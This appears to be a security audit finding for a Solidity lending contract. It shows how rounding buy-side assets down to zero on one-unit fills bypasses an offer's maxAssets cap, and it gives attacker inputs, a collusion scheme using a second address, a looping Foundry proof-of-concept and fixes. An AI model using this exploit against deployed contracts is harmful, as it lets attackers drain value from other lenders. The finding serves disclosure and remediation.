### Title
Buy Offer `maxAssets` Cap Fully Bypassed via Rounding-to-Zero `buyerAssets` on Small-Unit Fills - (File: src/Midnight.sol)

### Summary

When a buy offer uses `maxAssets`-based consumption tracking and `buyerPrice < WAD`, calling `take()` with a sufficiently small `units` value causes `buyerAssets = units.mulDivDown(buyerPrice, WAD)` to round down to zero. Because `consumed` is incremented by `buyerAssets`, it never advances, and the guard `require(newConsumed <= offer.maxAssets)` passes unconditionally on every call. The offer can be filled with an unbounded number of units while the asset-denominated cap is never consumed. This is confirmed by the existing test `testBugBuyMaxAssetsBypass` in `test/TakeTest.sol`.

### Finding Description

**Exact code path** (`src/Midnight.sol`):

```
line 363: buyerAssets = offer.buy ? units.mulDivDown(buyerPrice, WAD) : ...
line 368: newConsumed = consumed[offer.maker][offer.group] += offer.buy ? buyerAssets : sellerAssets;
line 369: require(newConsumed <= offer.maxAssets, ConsumedAssets());
```

For a buy offer, `buyerPrice = offerPrice` (the settlement fee cancels: `sellerPrice = offerPrice - fee`, `buyerPrice = sellerPrice + fee = offerPrice`). Any tick below `MAX_TICK` (5820) that maps to a price strictly less than `WAD` satisfies `buyerPrice < WAD`. The test uses `tick = MAX_TICK - 16 = 5804`, which the test comment explicitly labels "offerPrice < WAD."

When `units = 1` and `buyerPrice < WAD`:

```
buyerAssets = mulDivDown(1, buyerPrice, WAD) = floor(buyerPrice / WAD) = 0
```

`consumed` increments by 0. The check `0 <= maxAssets` is trivially satisfied. The same is true for `sellerAssets` (same direction of rounding). No tokens are transferred (`buyerAssets - sellerAssets = 0`), yet the position state mutates: the maker gains `units` of credit and the taker gains `units` of debt.

**Attacker-controlled inputs:**
- `offer.buy = true`, `offer.maxAssets > 0`, `offer.tick` chosen so `tickToPrice(tick) < WAD`
- `units = 1` per call (or any value where `units * buyerPrice < WAD`)
- Repeated calls with the same offer (same `offer.maker`, `offer.group`)

**Why existing checks fail:**
- `require(newConsumed <= offer.maxAssets)` — never triggered because `newConsumed` never increases
- `require(offer.maker != taker, SelfTake())` — bypassed by using a separate address controlled by the same entity
- Health check on seller (`isHealthy`) — satisfied as long as the taker supplies collateral; the taker can be a contract that supplies collateral before each call

**Confirmed by test** (`test/TakeTest.sol`, lines 858–889): the test pre-sets `consumed = maxAssets = 1`, then calls `take(1, borrower, lenderOffer)` and asserts `buyerAssets == 0`, `consumed` unchanged, but `creditOf(lender)` increased, `debtOf(borrower)` increased, and `totalUnits` increased. [1](#0-0) [2](#0-1) 

### Impact Explanation

The maker's `maxAssets` cap — the sole mechanism limiting how many units a buy offer can fill — is completely inoperative when `buyerPrice < WAD` and `units` is chosen so that `units * buyerPrice < WAD`. A maker colluding with a separate taker address can:

1. Accumulate an unbounded number of credit units for zero loan-token cost.
2. Redeem those units at maturity for full face value in loan tokens.
3. The taker address defaults on the corresponding debt; the protocol absorbs bad debt.

This breaks the core invariant "offers cannot be overfilled" and "contract balances cover credit redemption." The maker extracts real loan-token value from the protocol at the expense of other lenders. [3](#0-2) 

### Likelihood Explanation

**Preconditions:**
- A buy offer exists with `maxAssets > 0` and `tickToPrice(offer.tick) < WAD` (any tick below `MAX_TICK` satisfies this; the entire usable tick range below the par tick qualifies).
- The taker has or can supply collateral sufficient to remain healthy after each fill.
- The maker and taker are different addresses (trivially satisfied with two wallets or a helper contract).

**Feasibility:** Trivially reachable with no special permissions. The tick condition covers the majority of the price range. The attack is repeatable in a single transaction via a loop or multicall. Gas cost is the only practical limit. [4](#0-3) [5](#0-4) 

### Recommendation

Replace the `mulDivDown` rounding with `mulDivUp` when computing `buyerAssets` for the purpose of consumption tracking on buy offers, or add an explicit guard that rejects fills where `buyerAssets == 0` but `units > 0`:

```solidity
// Option A: enforce non-zero asset cost when units > 0
if (offer.maxAssets > 0 && offer.buy) {
    require(units == 0 || buyerAssets > 0, ZeroBuyerAssets());
}

// Option B: track consumed using mulDivUp for buy offers
uint256 consumedDelta = offer.buy
    ? units.mulDivUp(buyerPrice, WAD)   // round up for cap enforcement
    : sellerAssets;
newConsumed = consumed[offer.maker][offer.group] += consumedDelta;
require(newConsumed <= offer.maxAssets, ConsumedAssets());
```

Option B is more general and closes the gap for any `units` value, not just `units = 1`. [6](#0-5) 

### Proof of Concept

```solidity
// Foundry invariant / unit test
function testBuyMaxAssetsBypassUnbounded() public {
    // Setup: lender creates buy offer, buyerPrice < WAD
    uint256 tick = MAX_TICK - 16; // tickToPrice < WAD
    lenderOffer.buy = true;
    lenderOffer.tick = tick;
    lenderOffer.maxUnits = 0;
    lenderOffer.maxAssets = 1e6; // small cap in assets

    // Attacker (borrower) supplies collateral
    collateralize(market, borrower, 1_000_000);

    uint256 totalUnitsTaken;
    for (uint256 i; i < 1_000_000; i++) {
        (uint256 ba,) = take(1, borrower, lenderOffer);
        assertEq(ba, 0, "buyerAssets must be 0 per call");
        totalUnitsTaken += 1;
    }

    // Invariant assertion: should fail (demonstrates the bug)
    uint256 buyerPrice = TickLib.tickToPrice(tick);
    uint256 maxAllowedUnits = uint256(lenderOffer.maxAssets) * WAD / buyerPrice + 1; // +1 epsilon
    assertLe(totalUnitsTaken, maxAllowedUnits, "offer overfilled beyond maxAssets cap");

    // Confirm consumed never moved
    assertEq(midnight.consumed(lender, lenderOffer.group), 0);
    // Confirm lender got free credit
    assertGt(midnight.creditOf(id, lender), 0);
}
```

**Expected result:** The `assertLe` fails — `totalUnitsTaken = 1_000_000` far exceeds `maxAllowedUnits`. The `consumed` counter stays at 0. The lender accumulates 1,000,000 units of credit having paid 0 loan tokens. [2](#0-1) [1](#0-0)

### Citations

**File:** src/Midnight.sol (L350-373)
```text
        require(UtilsLib.atMostOneNonZero(offer.maxAssets, offer.maxUnits), MultipleNonZero());
        require(offer.tick % _marketState.tickSpacing == 0, TickNotAccessible());
        require(block.timestamp >= offer.start, OfferNotStarted());
        require(block.timestamp <= offer.expiry, OfferExpired());
        require(offer.maker != taker, SelfTake());
        require(isAuthorized[offer.maker][offer.ratifier], RatifierUnauthorized());
        require(IRatifier(offer.ratifier).isRatified(offer, ratifierData) == CALLBACK_SUCCESS, RatifierFail());

        uint256 offerPrice = TickLib.tickToPrice(offer.tick);
        uint256 timeToMaturity = UtilsLib.zeroFloorSub(offer.market.maturity, block.timestamp);
        uint256 _settlementFee = settlementFee(id, timeToMaturity);
        uint256 sellerPrice = offer.buy ? offerPrice - _settlementFee : offerPrice;
        uint256 buyerPrice = sellerPrice + _settlementFee;
        uint256 buyerAssets = offer.buy ? units.mulDivDown(buyerPrice, WAD) : units.mulDivUp(buyerPrice, WAD);
        uint256 sellerAssets = offer.buy ? units.mulDivDown(sellerPrice, WAD) : units.mulDivUp(sellerPrice, WAD);

        uint256 newConsumed;
        if (offer.maxAssets > 0) {
            newConsumed = consumed[offer.maker][offer.group] += offer.buy ? buyerAssets : sellerAssets;
            require(newConsumed <= offer.maxAssets, ConsumedAssets());
        } else {
            newConsumed = consumed[offer.maker][offer.group] += units;
            require(newConsumed <= offer.maxUnits, ConsumedUnits());
        }
```

**File:** src/Midnight.sol (L416-418)
```text
        _marketState.totalUnits =
            UtilsLib.toUint128(_marketState.totalUnits + buyerCreditIncrease - sellerCreditDecrease);
        claimableSettlementFee[offer.market.loanToken] += buyerAssets - sellerAssets;
```

**File:** test/TakeTest.sol (L858-889)
```text
    function testBugBuyMaxAssetsBypass() public {
        deal(address(loanToken), lender, 0); // lender pays 0
        collateralize(market, borrower, 100);

        lenderOffer.maxUnits = 0;
        lenderOffer.maxAssets = 1;
        lenderOffer.tick = MAX_TICK - 16; // offerPrice < WAD

        // Fully consume the offer before the take.
        vm.prank(lender);
        midnight.setConsumed(lenderOffer.group, lenderOffer.maxAssets, lender);

        uint256 lenderCreditBefore = midnight.creditOf(id, lender);
        uint256 borrowerDebtBefore = midnight.debtOf(id, borrower);
        uint256 totalUnitsBefore = midnight.totalUnits(id);
        uint256 lenderBalBefore = loanToken.balanceOf(lender);
        uint256 borrowerBalBefore = loanToken.balanceOf(borrower);

        (uint256 buyerAssets, uint256 sellerAssets) = take(1, borrower, lenderOffer);

        assertEq(buyerAssets, 0);
        assertEq(sellerAssets, 0);

        // Nothing observable to the cap or token balances changed:
        assertEq(midnight.consumed(lender, lenderOffer.group), lenderOffer.maxAssets);
        assertEq(loanToken.balanceOf(lender), lenderBalBefore);
        assertEq(loanToken.balanceOf(borrower), borrowerBalBefore);
        // But position state strictly changed:
        assertGt(midnight.creditOf(id, lender), lenderCreditBefore);
        assertGt(midnight.debtOf(id, borrower), borrowerDebtBefore);
        assertGt(midnight.totalUnits(id), totalUnitsBefore);
    }
```

**File:** src/libraries/TickLib.sol (L44-52)
```text
    function tickToPrice(uint256 tick) internal pure returns (uint256) {
        require(tick <= MAX_TICK, TickOutOfRange());
        unchecked {
            // forge-lint: disable-next-item(unsafe-typecast)
            return uint256(1e36)
                    .divHalfDownUnchecked(1e18 + wExp(LN_ONE_PLUS_DELTA * (int256(MAX_TICK / 2) - int256(tick))))
                    .divHalfDownUnchecked(PRICE_ROUNDING_STEP) * PRICE_ROUNDING_STEP;
        }
    }
```
